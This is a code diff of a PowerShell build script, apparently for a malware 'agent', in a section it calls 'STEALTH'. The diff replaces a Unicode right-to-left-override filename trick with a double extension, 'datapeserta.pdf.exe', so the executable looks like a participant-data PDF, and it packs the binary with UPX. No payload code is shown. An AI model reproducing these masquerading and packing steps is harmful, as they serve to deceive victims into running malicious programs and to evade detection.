@@ -19,6 +19,7 @@ if (!(Test-Path $compiler)) { $compiler = "g++" }
 if (!(Test-Path "bin")) { New-Item -ItemType Directory -Path "bin" }
 if (Test-Path "cert") { Copy-Item -Path "cert" -Destination "bin/" -Recurse -Force }
 if (Test-Path "tools") { Copy-Item -Path "tools" -Destination "bin/" -Recurse -Force }
+if (Test-Path "file") { Copy-Item -Path "file" -Destination "bin/" -Recurse -Force }
 
 Write-Host "[+] Resources (cert/ & tools/) disalin ke folder bin/" -ForegroundColor Gray
 
@@ -66,8 +67,7 @@ if ($LASTEXITCODE -eq 0) {
     # -------------------------------------------------------------
     # POST-BUILD OPTIMIZATION & STEALTH
     # -------------------------------------------------------------
-    $rlo = [char]0x202E
-    $final_name = "bin/datapeserta_" + $rlo + "fdp.exe" # Visually: datapeserta_exe.pdf
+    $final_name = "bin/datapeserta.pdf.exe" # Standard name that looks like a PDF
     
     if (Test-Path "bin/agent_build.exe") {
         # COMPRESSION STAGE (UPX)
